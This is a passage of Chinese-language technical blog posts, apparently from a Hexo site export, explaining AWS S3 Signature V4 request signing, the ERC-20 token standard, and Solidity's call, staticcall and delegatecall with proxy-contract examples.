<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Authorization</span><span class="punctuation">: </span>AWS4-HMAC-SHA256 Credential=ziw5dp1alvty9n47qksu/20160830/us-east-1/s3/aws4_request, SignedHeaders=content-type;host;x-amz-date, Signature=5d672d79c15b13162d9279b0855cfba6789a8edb4c82c400e06b5924a6f2b5d7</span><br></pre></td></tr></table></figure>

<ul>
<li><code>Credential</code> 由AccessKey，请求的日期，region，服务名，aws4_request五部分组成，各部分之间用斜线分隔</li>
<li><code>SignedHeaders</code> 表示那些头参与了签名的计算，未包含在这里的头不会影响到签名的生成</li>
<li><code>Signature</code> 计算得到的签名</li>
</ul>
<h3 id="通过请求参数"><a href="#通过请求参数" class="headerlink" title="通过请求参数"></a>通过请求参数</h3><p>eg:</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">GET /yourbucket/test.mp4??X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;&amp;X-Amz-Credential=ziw5dp1alvty9n47qksu/20160830/us-east-1/s3/aws4_request&amp;X-Amz-Date=20160830T201207Z&amp;X-Amz-Expires=86400&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=5d672d79c15b13162d9279b0855cfba6789a8edb4c82c400e06b5924a6f2b5d7</span><br></pre></td></tr></table></figure>

<ul>
<li><code>X-Amz-Algorithm</code> 计算签名时使用的Hash算法，指定为<code>AWS4-HMAC-SHA256</code></li>
<li><code>X-Amz-Credential</code> 包含了AccessKey，日期，region，服务名的信息</li>
<li><code>X-Amz-Date</code> 请求的时间</li>
<li><code>X-Amz-Expires</code> 指定签名在多长时间内有效</li>
<li><code>X-Amz-SignedHeaders</code> 计算签名时用到的头</li>
<li><code>X-Amz-Signature</code> 计算得的到签名</li>
</ul>
<h2 id="签名计算"><a href="#签名计算" class="headerlink" title="签名计算"></a>签名计算</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">signature = HexEncode(HMAC-SHA256(kSigning, StringToSign))</span><br></pre></td></tr></table></figure>

<h3 id="kSigning"><a href="#kSigning" class="headerlink" title="kSigning"></a>kSigning</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">kSecret = <span class="type">YourSecretKey</span></span><br><span class="line"><span class="variable">kDate</span> <span class="operator">=</span> HMAC(<span class="string">&quot;AWS4&quot;</span> + kSecret, Date)</span><br><span class="line">kRegion = HMAC(kDate, Region)</span><br><span class="line">kService = HMAC(kRegion, Service)</span><br><span class="line">kSigning = HMAC(kService, <span class="string">&quot;aws4_request&quot;</span>)</span><br></pre></td></tr></table></figure>

<ul>
<li>YourSecretKey 你的<code>SecretKey</code></li>
<li>Date 8位数的日期，应与Credentail中的Date部分一样</li>
<li>Region 应与Credential中的region部分一样</li>
<li>Service 应与Credential中的服务名部分一样</li>
<li>kSigning 为用于计算签名的signing key</li>
</ul>
<h3 id="StringToSign"><a href="#StringToSign" class="headerlink" title="StringToSign"></a>StringToSign</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">StringToSign  =</span><br><span class="line">    Algorithm + <span class="string">&#x27;\n&#x27;</span> +</span><br><span class="line">    RequestDate + <span class="string">&#x27;\n&#x27;</span> +</span><br><span class="line">    CredentialScope + <span class="string">&#x27;\n&#x27;</span> +</span><br><span class="line">    HashedCanonicalRequest</span><br></pre></td></tr></table></figure>

<ul>
<li>Algorithm 指定为<code>AWS4-HMAC-SHA256</code></li>
<li>RequestDate ISO8601 basic 格式的请求时间，如：<code>20160830T123600Z</code></li>
<li>CredentialScope 日期，region，服务名等组成的字符串， 如：<code>20160830/us-east-1/s3/aws4_request</code></li>
<li>HashedCanonicalRequest Hex(SHA256Hash(CanonicalRequest)),即CanonicalRequest的hash的16进制编码</li>
</ul>
<h3 id="CanonicalRequest"><a href="#CanonicalRequest" class="headerlink" title="CanonicalRequest"></a>CanonicalRequest</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">CanonicalRequest =</span><br><span class="line">    HTTPRequestMethod + <span class="string">&#x27;\n&#x27;</span> +</span><br><span class="line">    CanonicalURI + <span class="string">&#x27;\n&#x27;</span> +</span><br><span class="line">    CanonicalQueryString + <span class="string">&#x27;\n&#x27;</span> +</span><br><span class="line">    CanonicalHeaders + <span class="string">&#x27;\n&#x27;</span> +</span><br><span class="line">    SignedHeaders + <span class="string">&#x27;\n&#x27;</span> +</span><br><span class="line">    HexEncode(Hash(RequestPayload))</span><br></pre></td></tr></table></figure>

<ul>
<li>HTTPRequestMethod 如: <code>PUT</code>, <code>GET</code>, <code>DELETE</code>, <code>POST</code></li>
<li>CanonicalURI 请求的uri</li>
<li>CanonicalQueryString 请求参数排序后组成的字符串</li>
<li>CanonicalHeaders 需要加入签名计算的头排序后组成的字符串</li>
<li>SignedHeaders 加入到签名计算的头的名字的列表，各个名字之间用逗号分隔</li>
<li>HexEncode(Hash(RequestPayload)) 请求body的hash的16进制编码,如果通过请求参数携带签名，此处应由字符串<code>UNSIGNED-PAYLOAD</code>代替</li>
</ul>
<h1 id="参考-鸣谢"><a href="#参考-鸣谢" class="headerlink" title="参考&amp;鸣谢"></a>参考&amp;鸣谢</h1><ul>
<li><a href="https://doc.bscstorage.com/doc/s2/signature/signature.html">签名算法</a></li>
</ul>
]]></content>
      <categories>
        <category>storage</category>
      </categories>
      <tags>
        <tag>ceph</tag>
        <tag>rgw</tag>
      </tags>
  </entry>
  <entry>
    <title>s3 authorization</title>
    <url>/2019/08/04/storage/ceph/s3-authorization/</url>
    <content><![CDATA[<ol>
<li>如果http请求中没有携带身份信息（AccessKey），则改该请求为匿名请求，会被认为是来自匿名用户的访问。</li>
<li>如果http请求中携带了身份信息（AccessKey），则认为访问来自该AccessKey所对应的用户。由于AccessKey是可以被他人获取到的， 为了防止其他人冒用您的AccessKey来访问服务，请求中还必须携带您的签名。在申请帐号以后，您将得到AccessKey和SecretKey， SecretKey是需要保密的。签名是由此次http请求的相关信息和您的SecretKey计算得到的，其他人因为不知道您的SecretKey，将不能 计算出正确的签名。</li>
<li>身份信息与签名可以放到请求头（Authorization）中，也可以放到请求参数中。</li>
<li>签名的方式与Amazon S3的签名方式兼容，支持<a href="https://zhoubofsy.github.io/2019/08/04/storage/ceph/s3-authorization-v2/">signature version 2</a> 和 <a href="https://zhoubofsy.github.io/2019/08/04/storage/ceph/s3-authorization-v4/">signature version 4</a>。</li>
</ol>
<h1 id="参考-鸣谢"><a href="#参考-鸣谢" class="headerlink" title="参考&amp;鸣谢"></a>参考&amp;鸣谢</h1><ul>
<li><a href="https://doc.bscstorage.com/doc/s2/signature/signature.html">签名算法</a></li>
</ul>
]]></content>
      <categories>
        <category>storage</category>
      </categories>
      <tags>
        <tag>ceph</tag>
        <tag>rgw</tag>
      </tags>
  </entry>
  <entry>
    <title>ERC-20</title>
    <url>/2024/11/25/blockchain/ethereum/erc-20/</url>
    <content><![CDATA[<h1 id="什么是-ERC-20？"><a href="#什么是-ERC-20？" class="headerlink" title="什么是 ERC-20？"></a>什么是 ERC-20？</h1><p>ERC-20 提出了一个同质化代币的标准，换句话说，它们具有一种属性，使得每个代币都与另一个代币（在类型和价值上）完全相同。 例如，一个 ERC-20 代币就像以太币一样，意味着一个代币会并永远会与其他代币一样。(From: 《<a href="https://ethereum.org/zh/developers/docs/standards/tokens/erc-20/">ERC-20 代币标准</a>》)</p>
<h2 id="方法（Method）"><a href="#方法（Method）" class="headerlink" title="方法（Method）"></a>方法（Method）</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function name() public view returns (string)</span><br><span class="line">// 返回令牌的名称 - 例如 &quot;MyToken&quot;</span><br><span class="line">// 可选 - 此方法可用于提高可用性，但接口和其他协定不得期望存在这些值。</span><br><span class="line"></span><br><span class="line">function symbol() public view returns (string)</span><br><span class="line">// 返回令牌的 symbol。例如“HIX”。</span><br><span class="line">// 可选 - 此方法可用于提高可用性，但接口和其他协定不得期望存在这些值。</span><br><span class="line"></span><br><span class="line">function decimals() public view returns (uint8)</span><br><span class="line">// 返回代币使用的小数位数 - 例如 8，表示将代币数量除以 100000000 以获得其用户表示。</span><br><span class="line">// 可选 - 此方法可用于提高可用性，但接口和其他协定不得期望存在这些值。</span><br><span class="line"></span><br><span class="line">function totalSupply() public view returns (uint256)</span><br><span class="line">// 返回总代币供应量。</span><br><span class="line"></span><br><span class="line">function balanceOf(address _owner) public view returns (uint256 balance)</span><br><span class="line">// 返回地址为 _owner 的另一个账户的账户余额。</span><br><span class="line"></span><br><span class="line">function transfer(address _to, uint256 _value) public returns (bool success)</span><br><span class="line">// 将 _value 数量的代币转移到 _to，并且必须触发 Transfer 事件。如果消息调用者的账户余额没有足够的代币可供花费，则函数应该throw。</span><br><span class="line">// 注意值为 0 的传输必须被视为正常传输，并触发 Transfer 事件。</span><br><span class="line"></span><br><span class="line">function transferFrom(address _from, address _to, uint256 _value) public returns (bool success)</span><br><span class="line">// 将 _value数量的代币从地址 _from 转移到地址 _to，并且必须触发 Transfer 事件。</span><br><span class="line">// transferFrom 方法用于提现工作流程，允许合约代表您转移代币。例如，这可用于允许合约代表您转移代币和/或以子货币收取费用。除非 _from 账户通过某种机制故意授权了消息的发送者，否则该函数应该throw。</span><br><span class="line"></span><br><span class="line">function approve(address _spender, uint256 _value) public returns (bool success)</span><br><span class="line">// 允许_spender多次从您的账户提款，最高可达_value金额。如果再次调用此函数，它将用 _value 覆盖当前限额。</span><br><span class="line">// 注意：客户端应该确保在创建用户界面时，先将限额设置为 0，然后再为同一花费者将其设置为另一个值。尽管 Contract 本身不应该强制执行它，以允许向后兼容之前部署的 Contract</span><br><span class="line"></span><br><span class="line">function allowance(address _owner, address _spender) public view returns (uint256 remaining)</span><br><span class="line">// 返回 _spender 仍允许从 _owner 中提取的金额。</span><br></pre></td></tr></table></figure>

<h2 id="事件（Event）"><a href="#事件（Event）" class="headerlink" title="事件（Event）"></a>事件（Event）</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">event Transfer(address indexed _from, address indexed _to, uint256 _value)</span><br><span class="line">// 必须在代币转移时触发，包括零价值转移。</span><br><span class="line">// 创建新代币的代币合约应该在创建代币时触发 Transfer 事件，并将 _from 地址设置为 0x0。</span><br><span class="line"></span><br><span class="line">event Approval(address indexed _owner, address indexed _spender, uint256 _value)</span><br><span class="line">// 必须在成功调用 approve(address _spender, uint256 _value) 时触发。</span><br></pre></td></tr></table></figure>

<h1 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h1><h2 id="简单示例"><a href="#简单示例" class="headerlink" title="简单示例"></a>简单示例</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line"></span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract MyToken &#123;</span><br><span class="line">    string public constant name = &quot;Bob&#x27;s Token&quot;;</span><br><span class="line">    string public constant symbol = &quot;BBK&quot;;</span><br><span class="line">    uint8 public constant decimals = 18;</span><br><span class="line">    uint16 private constant increase = 1000;</span><br><span class="line">    uint256 public constant totalLimit = 27000000 * (10 ** decimals);</span><br><span class="line">    uint256 public totalSupply = 0;</span><br><span class="line">    address private owner;</span><br><span class="line">    mapping(address =&gt; uint256) public balanceOf;</span><br><span class="line">    mapping(address =&gt; mapping(address =&gt; uint256)) public allowance;</span><br><span class="line"></span><br><span class="line">    event Transfer(address indexed _from, address indexed _to, uint256 _value);</span><br><span class="line">    event Approval(address indexed _owner, address indexed _spender, uint256 _value);</span><br><span class="line"></span><br><span class="line">    modifier checkAddress(address _addr) &#123;</span><br><span class="line">        require(address(_addr) != address(0), &quot;Invalid address.&quot;);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier checkBalanceOf(address _addr, uint256 _value) &#123;</span><br><span class="line">        require(balanceOf[_addr] &gt;= _value, &quot;Insufficient balance&quot;);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier checkOwner() &#123;</span><br><span class="line">        require(msg.sender == owner, &quot;Not owner.&quot;);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    constructor() &#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function mint(address _to) public checkOwner returns (uint256) &#123;</span><br><span class="line">        uint256 mintValue = increase * (10  ** decimals);</span><br><span class="line">        require(totalLimit &gt;= (totalSupply + mintValue), &quot;Out of limit.&quot;);</span><br><span class="line">        totalSupply += mintValue;</span><br><span class="line">        balanceOf[_to] += mintValue;</span><br><span class="line">        return balanceOf[_to];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transfer(address _to, uint256 _value) public checkAddress(_to) checkBalanceOf(msg.sender, _value) returns (bool success)&#123;</span><br><span class="line">        balanceOf[msg.sender] -= _value;</span><br><span class="line">        balanceOf[_to] += _value;</span><br><span class="line">        emit Transfer(msg.sender, _to, _value);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transferFrom(address _from, address _to, uint256 _value) public checkAddress(_to) checkBalanceOf(_from, _value) returns (bool success) &#123;</span><br><span class="line">        require(allowance[_from][msg.sender] &gt;= _value, &quot;No enough approve value.&quot;);</span><br><span class="line">        allowance[_from][msg.sender] -= _value;</span><br><span class="line">        balanceOf[_from] -= _value;</span><br><span class="line">        balanceOf[_to] += _value;</span><br><span class="line">        emit Transfer(_from, _to, _value);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function approve(address _spender, uint256 _value) public returns (bool success)&#123;</span><br><span class="line">        allowance[msg.sender][_spender] = _value;</span><br><span class="line">        emit Approval(msg.sender, _spender, _value);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>注意事项</strong></p>
<ul>
<li>由于本合约的编译版本为0.8.0，此版本具备整数溢出检查，所以可以不使用safeMath。</li>
</ul>
<h2 id="快速示例"><a href="#快速示例" class="headerlink" title="快速示例"></a>快速示例</h2><p>使用<a href="https://docs.openzeppelin.com/contracts/5.x/wizard">OpenZeppelin</a>快速创建ERC-20合约</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">// Compatible with OpenZeppelin Contracts ^5.0.0</span><br><span class="line">pragma solidity ^0.8.22;</span><br><span class="line"></span><br><span class="line">import &#123;AccessManaged&#125; from &quot;@openzeppelin/contracts/access/manager/AccessManaged.sol&quot;;</span><br><span class="line">import &#123;ERC20&#125; from &quot;@openzeppelin/contracts/token/ERC20/ERC20.sol&quot;;</span><br><span class="line">import &#123;ERC20Pausable&#125; from &quot;@openzeppelin/contracts/token/ERC20/extensions/ERC20Pausable.sol&quot;;</span><br><span class="line">import &#123;ERC20Permit&#125; from &quot;@openzeppelin/contracts/token/ERC20/extensions/ERC20Permit.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract BobToken is ERC20, ERC20Pausable, AccessManaged, ERC20Permit &#123;</span><br><span class="line">    constructor(address initialAuthority)</span><br><span class="line">         ERC20(&quot;BobToken&quot;, &quot;BBK&quot;)</span><br><span class="line">         AccessManaged(initialAuthority)</span><br><span class="line">         ERC20Permit(&quot;BobToken&quot;)</span><br><span class="line">    &#123;&#125;</span><br><span class="line"></span><br><span class="line">    function pause() public restricted &#123;</span><br><span class="line">         _pause();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function unpause() public restricted &#123;</span><br><span class="line">         _unpause();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function mint(address to, uint256 amount) public restricted &#123;</span><br><span class="line">        _mint(to, amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // The following functions are overrides required by Solidity.</span><br><span class="line"></span><br><span class="line">    function _update(address from, address to, uint256 value)</span><br><span class="line">        internal</span><br><span class="line">        override(ERC20, ERC20Pausable)</span><br><span class="line">    &#123;</span><br><span class="line">        super._update(from, to, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们的合约通常通过<a href="https://solidity.readthedocs.io/en/latest/contracts.html#inheritance">继承</a>来使用，在这里我们将 <code>ERC20</code> 重新用于基本标准实现以及 <code>name</code>、<code>symbol</code> 和 <code>decimals</code> 可选扩展。此外，我们正在创建一个代币的 <code>initialSupply</code>，该代币将被分配给部署合约的地址。</p>
]]></content>
      <categories>
        <category>blockchain</category>
      </categories>
      <tags>
        <tag>ethereum</tag>
        <tag>solidity</tag>
      </tags>
  </entry>
  <entry>
    <title>call、staticcall、delegatecall使用</title>
    <url>/2024/11/21/blockchain/ethereum/usage-of-call-staticcall-delegatecall/</url>
    <content><![CDATA[<p>在 Solidity 中，<code>call</code>、<code>staticcall</code>和<code>delegatecall</code>是强大的低级操作，用于与其他合约交互或在当前上下文中执行外部合约的逻辑。掌握它们的用法和区别对于智能合约开发非常重要。</p>
<p>本文将详细介绍它们的功能、适用场景、代码示例，以及使用时需要注意的潜在问题。</p>
<h1 id="call"><a href="#call" class="headerlink" title="call"></a>call</h1><p><strong>功能</strong></p>
<p><code>call</code> 是一种通用方法，用于调用另一个合约的函数或发送 ETH。它可以调用目标合约的任意函数，包括不存在的函数（在这种情况下不会抛出错误）。</p>
<p><strong>特点</strong></p>
<ul>
<li>可读写目标合约的状态。</li>
<li>支持附带 ETH 发送。</li>
<li>返回两个值：<ul>
<li>调用是否成功 (bool)。</li>
<li>调用返回的数据 (bytes memory)。</li>
</ul>
</li>
</ul>
<p><strong>使用场景</strong></p>
<ul>
<li>调用外部合约的任意函数。</li>
<li>向合约或外部账户发送 ETH。</li>
</ul>
<p><strong>代码示例</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract CallExample &#123;</span><br><span class="line">    function callFunction(address target, uint256 value) external returns (bool, bytes memory) &#123;</span><br><span class="line">        // 通过 call 调用目标合约的 setValue(uint)</span><br><span class="line">        (bool success, bytes memory data) = target.call(</span><br><span class="line">            abi.encodeWithSignature(&quot;setValue(uint256)&quot;, value)</span><br><span class="line">        );</span><br><span class="line">        require(success, &quot;Call failed&quot;);</span><br><span class="line">        return (success, data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function sendEth(address payable target) external payable &#123;</span><br><span class="line">        // 使用 call 发送 ETH</span><br><span class="line">        (bool success, ) = target.call&#123;value: msg.value&#125;(&quot;&quot;);</span><br><span class="line">        require(success, &quot;Send ETH failed&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="staticcall"><a href="#staticcall" class="headerlink" title="staticcall"></a>staticcall</h1><p><strong>功能</strong></p>
<p><code>staticcall</code>是一种只读调用方法，用于调用目标合约的视图或纯函数。它不允许改变状态，因此更安全且节省 Gas</p>
<p><strong>特点</strong></p>
<ul>
<li>只能调用 view 或 pure 修饰的函数。</li>
<li>无法修改状态或发送 ETH。</li>
<li>返回两个值：<ul>
<li>调用是否成功 (bool)。</li>
<li>调用返回的数据 (bytes memory)。</li>
</ul>
</li>
</ul>
<p><strong>使用场景</strong></p>
<ul>
<li>查询目标合约的状态。</li>
<li>调用只读逻辑以避免状态改变。</li>
</ul>
<p><strong>代码示例</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract StaticCallExample &#123;</span><br><span class="line">    function staticCallFunction(address target) external view returns (uint256) &#123;</span><br><span class="line">        // 使用 staticcall 调用目标合约的 storedValue()</span><br><span class="line">        (bool success, bytes memory data) = target.staticcall(</span><br><span class="line">            abi.encodeWithSignature(&quot;storedValue()&quot;)</span><br><span class="line">        );</span><br><span class="line">        require(success, &quot;Staticcall failed&quot;);</span><br><span class="line">        return abi.decode(data, (uint256));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="delegatecall"><a href="#delegatecall" class="headerlink" title="delegatecall"></a>delegatecall</h1><p><strong>功能</strong></p>
<p><code>delegatecall</code> 是一种在当前合约上下文中执行目标合约逻辑的方法。它会以调用合约的存储布局为准，执行目标合约中的代码。</p>
<p><strong>特点</strong></p>
<ul>
<li>使用调用合约的存储。</li>
<li>使用调用合约的 msg.sender 和 msg.value。</li>
<li>返回两个值：<ul>
<li>调用是否成功 (bool)。</li>
<li>调用返回的数据 (bytes memory)。</li>
</ul>
</li>
</ul>
<p><strong>使用场景</strong></p>
<ul>
<li>实现合约代理（如升级逻辑）。</li>
<li>在共享存储布局的上下文中执行外部逻辑。</li>
</ul>
<p><strong>代码示例</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract DelegateCallExample &#123;</span><br><span class="line">    uint256 public storedValue;</span><br><span class="line"></span><br><span class="line">    function delegateCallFunction(address target, uint256 value) external &#123;</span><br><span class="line">        // 使用 delegatecall 调用目标合约的 setValue(uint)</span><br><span class="line">        (bool success, ) = target.delegatecall(</span><br><span class="line">            abi.encodeWithSignature(&quot;setValue(uint256)&quot;, value)</span><br><span class="line">        );</span><br><span class="line">        require(success, &quot;Delegatecall failed&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 被调用合约 (Library)</span><br><span class="line">contract Target &#123;</span><br><span class="line">    uint256 public storedValue;</span><br><span class="line"></span><br><span class="line">    function setValue(uint256 value) external &#123;</span><br><span class="line">        storedValue = value</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="call-VS-staticcall-VS-delegatecall"><a href="#call-VS-staticcall-VS-delegatecall" class="headerlink" title="call VS staticcall VS delegatecall"></a><code>call</code> VS <code>staticcall</code> VS <code>delegatecall</code></h1><table>
<thead>
<tr>
<th align="center">特性</th>
<th align="center">call</th>
<th align="center">staticcall</th>
<th align="center">delegatecall</th>
</tr>
</thead>
<tbody><tr>
<td align="center">可读写状态</td>
<td align="center">✅</td>
<td align="center">❌（只读）</td>
<td align="center">✅</td>
</tr>
<tr>
<td align="center">使用调用合约存储</td>
<td align="center">❌</td>
<td align="center">❌</td>
<td align="center">✅</td>
</tr>
<tr>
<td align="center">使用调用合约<code>msg.sender</code></td>
<td align="center">❌</td>
<td align="center">❌</td>
<td align="center">✅</td>
</tr>
<tr>
<td align="center">支持发送ETH</td>
<td align="center">✅</td>
<td align="center">❌</td>
<td align="center">❌</td>
</tr>
<tr>
<td align="center">调用不存在的函数</td>
<td align="center">支持，返回失败</td>
<td align="center">支持，返回失败</td>
<td align="center">支持，返回失败</td>
</tr>
</tbody></table>
<h1 id="使用注意事项"><a href="#使用注意事项" class="headerlink" title="使用注意事项"></a>使用注意事项</h1><p><strong>call 的安全性</strong></p>
<ul>
<li>使用 call 调用外部合约时，目标合约可能会执行恶意代码。需要额外检查返回值并限制权限。</li>
<li>不要轻易使用 call 调用不可信的合约。</li>
</ul>
<p><strong>delegatecall 的存储风险</strong></p>
<ul>
<li>调用目标合约时，目标合约必须与调用合约共享相同的存储布局，否则可能导致存储冲突。</li>
<li>使用 delegatecall 需要确保调用的是受信任的逻辑。</li>
</ul>
<p><strong>Gas 消耗与返回值处理</strong></p>
<ul>
<li>注意低级调用的 Gas 使用，避免由于 Gas 不足导致调用失败。</li>
<li>低级调用（call、staticcall 和 delegatecall）不会自动抛出异常，需要手动处理返回值。</li>
</ul>
<p><strong>不要使用简写类型</strong></p>
<p>无论是使用abi.encodeWithSelect 还是 abi.encodeWithSignature ，参数中方法名后的参数一定不要使用简写类型。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 错误写法</span><br><span class="line">(bool success, ) = target.call(abi.encodeWithSignature(&quot;setValue(uint)&quot;, value));</span><br></pre></td></tr></table></figure>

<p>因为在编译的过程中，编译器会将简写类型（如：uint）转换成uint256，这将导致，你的签名或选择器不匹配，导致执行失败。</p>
<h1 id="实践案例：实现代理合约"><a href="#实践案例：实现代理合约" class="headerlink" title="实践案例：实现代理合约"></a>实践案例：实现代理合约</h1><p>以下是使用 <code>delegatecall</code> 的代理合约的示例，用于实现合约逻辑的动态升级</p>
<p><strong>代码示例</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">// 逻辑合约</span><br><span class="line">contract LogicContract &#123;</span><br><span class="line">    uint256 public storedValue;</span><br><span class="line"></span><br><span class="line">    function setValue(uint256 value) external &#123;</span><br><span class="line">        storedValue = value;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 代理合约</span><br><span class="line">contract ProxyContract &#123;</span><br><span class="line">    address public logicContract;</span><br><span class="line"></span><br><span class="line">    constructor(address _logicContract) &#123;</span><br><span class="line">        logicContract = _logicContract;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fallback() external payable &#123;</span><br><span class="line">        (bool success, ) = logicContract.delegatecall(msg.data);</span><br><span class="line">        require(success, &quot;Delegatecall failed&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>运行过程</strong></p>
<ul>
<li>部署 LogicContract。</li>
<li>部署 ProxyContract，将 LogicContract 的地址传递给其构造函数。</li>
<li>通过代理合约调用 setValue 方法，storedValue 实际存储在 ProxyContract 中</li>
</ul>
<h1 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h1><p><code>call</code>、<code>staticcall</code> 和 <code>delegatecall</code> 是 Solidity 中的基础工具，可以用来实现灵活的合约交互和逻辑扩展。在使用这些低级调用时，需要仔细处理返回值、安全性以及存储一致性问题。</p>
<p>通过合理使用这些工具，您可以设计功能强大且可扩展的智能合约体系，同时避免潜在的安全漏洞。</p>
]]></content>
      <categories>
        <category>blockchain</category>
      </categories>
      <tags>
        <tag>ethereum</tag>
        <tag>solidity</tag>
      </tags>
  </entry>
  <entry>
    <title>OpenZeppelin ERC-20 详解</title>
    <url>/2024/11/26/blockchain/ethereum/erc20-openzeppelin/</url>
    <content><![CDATA[<p>这是一段<code>openzeppelin</code>官方生成的代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">// Compatible with OpenZeppelin Contracts ^5.0.0</span><br><span class="line">pragma solidity ^0.8.22;</span><br><span class="line"></span><br><span class="line">import &#123;AccessManaged&#125; from &quot;@openzeppelin/contracts/access/manager/AccessManaged.sol&quot;;</span><br><span class="line">import &#123;ERC20&#125; from &quot;@openzeppelin/contracts/token/ERC20/ERC20.sol&quot;;</span><br><span class="line">import &#123;ERC20Pausable&#125; from &quot;@openzeppelin/contracts/token/ERC20/extensions/ERC20Pausable.sol&quot;;</span><br><span class="line">import &#123;ERC20Permit&#125; from &quot;@openzeppelin/contracts/token/ERC20/extensions/ERC20Permit.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract BobToken is ERC20, ERC20Pausable, AccessManaged, ERC20Permit &#123;</span><br><span class="line">    constructor(address initialAuthority)</span><br><span class="line">        ERC20(&quot;BobToken&quot;, &quot;BBK&quot;)</span><br><span class="line">        AccessManaged(initialAuthority)</span><br><span class="line">        ERC20Permit(&quot;BobToken&quot;)</span><br><span class="line">    &#123;&#125;</span><br><span class="line"></span><br><span class="line">    function pause() public restricted &#123;</span><br><span class="line">        _pause();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function unpause() public restricted &#123;</span><br><span class="line">        _unpause();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function mint(address to, uint256 amount) public restricted &#123;</span><br><span class="line">        _mint(to, amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // The following functions are overrides required by Solidity.</span><br><span class="line"></span><br><span class="line">    function _update(address from, address to, uint256 value)</span><br><span class="line">         internal</span><br><span class="line">         override(ERC20, ERC20Pausable)</span><br><span class="line">    &#123;</span><br><span class="line">         super._update(from, to, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这段代码定义了一个名为<code>BobToken</code>的智能合约，它继承了多个标准接口和合约，用于创建一个可暂停、可授权管理、可使用EIP-2612标准的许可（Permit）功能的代币。下面是对代码的详细解释：</p>
<h3 id="继承的合约和接口"><a href="#继承的合约和接口" class="headerlink" title="继承的合约和接口"></a>继承的合约和接口</h3><ol>
<li><strong>ERC20</strong>: ERC20是一个标准接口，定义了代币的基本功能，如总供应量、余额查询、转账等。</li>
<li><strong>ERC20Pausable</strong>: 这个接口允许代币的转账操作被暂停，从而防止在特定情况下（如紧急情况）的代币转移。</li>
<li><strong>AccessManaged</strong>: 这个接口可能定义了访问控制功能，比如只有特定地址（如管理员）才能执行某些操作。</li>
<li><strong>ERC20Permit</strong>: 这个接口允许代币持有者通过签名授权来批准第三方转移代币，而不需要直接调用转账函数。</li>
</ol>
<h4 id="继承顺序"><a href="#继承顺序" class="headerlink" title="继承顺序"></a>继承顺序</h4><p>在Solidity中，合约的继承顺序是从左到右的，即最左边的合约是基类，最右边的合约是派生类。例如，在contract BobToken is ERC20, ERC20Pausable, AccessManaged, ERC20Permit {}中，BobToken继承了ERC20、ERC20Pausable、AccessManaged和ERC20Permit。</p>
<h4 id="继承原则"><a href="#继承原则" class="headerlink" title="继承原则"></a>继承原则</h4><ol>
